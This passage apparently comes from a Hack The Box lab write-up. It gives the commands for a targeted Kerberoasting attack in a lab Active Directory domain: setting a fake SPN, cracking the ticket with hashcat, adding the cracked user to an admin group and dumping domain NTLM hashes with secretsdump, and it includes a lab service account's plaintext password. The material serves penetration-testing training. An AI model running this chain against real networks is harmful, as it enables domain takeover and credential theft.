Digging into the BloodHound data we see that we have `GenericWrite` over the `ttimmons` user. Using this we can set a fake SPN on the `ttimmons account` and perform a targeted Kerberoasting attack. If this user is using a weak password then we can crack it and proceed onwards.

![](Active%20Directory%20Compromise-20260906-160048.png)

```powershell
PS C:\DotNetNuke\Portals\0> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force 
PS C:\DotNetNuke\Portals\0> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
```

```powershell
PS C:\DotNetNuke\Portals\0> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```

```shell
3kjS@htb[/htb]$ proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
```

```shell
3kjS@htb[/htb]$ hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
```

![](Active%20Directory%20Compromise-20260906-160234.png)

![](Active%20Directory%20Compromise-20260906-160238.png)

```powershell
PS C:\htb> PS C:\DotNetNuke\Portals\0> $timpass = ConvertTo-SecureString '<PASSWORD REDACTED>' -AsPlainText -Force 
PS C:\DotNetNuke\Portals\0> $timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
```

```powershell
PS C:\DotNetNuke\Portals\0> $group = Convert-NameToSid "Server Admins" 
PS C:\DotNetNuke\Portals\0> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
```

```shell
3kjS@htb[/htb]$ proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```
